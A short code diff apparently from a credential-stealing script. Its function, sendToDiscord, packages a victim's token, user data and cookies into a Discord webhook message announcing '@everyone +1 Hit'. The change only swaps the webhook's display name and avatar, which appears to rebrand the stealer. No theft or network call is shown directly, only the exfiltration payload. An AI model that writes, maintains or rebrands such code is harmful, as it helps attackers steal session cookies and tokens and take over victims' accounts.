@@ -2232,8 +2232,8 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
       // Send both embeds together in a single message with @everyone notification
       const combinedPayload = {
         content: "@everyone +1 Hit",
-        username: "INC HAR",  // Custom webhook username
-        avatar_url: "https://static.vecteezy.com/ti/vecteur-libre/p1/9029642-inc-logo-inc-letter-inc-letter-logo-design-initials-inc-logo-linked-with-circle-and-uppercase-monogram-logo-inc-typography-for-technology-business-and-real-marque-immobilier-vectoriel.jpg",  // Custom webhook avatar
+        username: "QNC",  // Custom webhook username
+        avatar_url: "https://imgur.com/a/cddQVcR",  // Custom webhook avatar
         embeds: [userDataEmbed, cookieEmbed]
       };
 
